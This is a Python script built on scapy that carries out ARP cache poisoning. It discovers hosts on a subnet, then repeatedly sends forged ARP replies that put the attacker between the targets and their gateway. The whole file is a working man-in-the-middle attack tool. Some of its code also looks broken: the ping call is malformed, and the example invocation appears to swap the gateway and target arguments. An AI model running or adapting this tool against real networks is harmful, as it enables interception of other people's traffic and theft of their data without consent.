from scapy.all import *
from multiprocessing import Process
from colorama import init, Fore
import logging,subprocess

white   = Fore.WHITE
black   = Fore.BLACK
red     = Fore.RED
reset   = Fore.RESET
blue    = Fore.BLUE
cyan    = Fore.CYAN
yellow  = Fore.YELLOW
green   = Fore.GREEN
magenta = Fore.MAGENTA

class Error(Exception):
    pass

class ARPPoison():
    def __init__(self,gateway,targets="",verbose=1):
        self.gateway = gateway
        self.targets = []
        for x in list(targets.split("/")):
            self.targets.append((x,self.get_mac_address(x)))

        if not self.targets:
            self.targets = self.discover_net(self.gateway)
            self.targets = [(x,self.get_mac_address(x)) for x in self.targets]

        self.g_mac       = self.get_mac_address(gateway)
        
        for i,x in self.targets:
            if not x:
                logging.error(f"Error getting mac address from {i}")
                # raise Error("Error getting mac addresses")
                self.targets.remove((i,x))
        if not self.targets or not self.g_mac: logging.critical("Error getting mac addresses");raise Error("Error getting mac addresses")

        init()
        logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
        logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
        logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
        logging.addLevelName(logging.DEBUG, f"[{magenta}*{reset}]")
        logging.basicConfig(format="%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.INFO)

    def discover_net(self,gateway):
        gateway = gateway[:-1]
        hosts = []

        for i in range(1,254):
            res = subprocess.call(['ping', '-c', '3'], gateway+str(i))
            if res == 0:
                hosts.append(gateway+str(i))

        return hosts

    def get_mac_address(self,t_ip : str):
        try:
            arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=t_ip)
            ans, uns      = srp(arp_broadcast, timeout=2,verbose=0)

            return ans[0][1][1].hwsrc
        except:
            return None

    def poison_arp(self,t_ip:str, t_mac:str, g_ip:str):
        try:
            arp_spoof = ARP(op=2, psrc=g_ip, pdst=t_ip, hwdst=t_mac)
            send(arp_spoof,verbose=0)
        except:
            logging.error(f"Error trying to poison ARP from {t_ip}")

    def restore_arp(self,t_ip:str, t_mac:str, s_ip, s_mac):
        try:
            pkt = ARP(op=2, hwsrc=s_mac, psrc=s_ip, pdst=t_ip, hwdst=t_mac)
            send(pkt,verbose=0)
            logging.info(f"{t_ip} ARP restored")
        except:
            logging.error(f"Error trying to restore ARP from {t_ip}")

    def start(self):
        try:
            logging.debug("ARP: Starting sniff thread")
            self.main_thread = Process(target=self.main)
            self.main_thread.start()
        except:
            logging.critical("An error ocurred trying to start main thread")
            raise Error("An error ocurred trying to start main thread")

    def stop(self):
        try:
            self.main_thread.kill()
            logging.debug("ARP: Sniff thread stopped")
        except:
            logging.critical("An error ocurred trying to kill main thread")
            raise Error("An error ocurred trying to kill main thread")

        for target, t_mac in self.targets:
            self.restore_arp(self.gateway,self.g_mac, target,t_mac)
            self.restore_arp(target,t_mac, self.gateway,self.g_mac)

    def main(self):
        logging.debug(f"ARP: Gateway MAC: {self.g_mac}")
        for target, t_mac in self.targets:
            logging.debug(f"ARP: Target {target} MAC: {t_mac}")

        try:
            while True:
                for target,t_mac in self.targets:
                    self.poison_arp(target,t_mac,self.gateway)
                    self.poison_arp(self.gateway,self.g_mac,target)
        except KeyboardInterrupt:
            logging.debug("ARP spoof stoped")

if __name__ == "__main__":
    arppoison = ARPPoison("192.168.1.106/192.168.1.100","192.168.1.1")
    try:
        arppoison.start()
        arppoison.main_thread.join()
    except KeyboardInterrupt:
        arppoison.stop()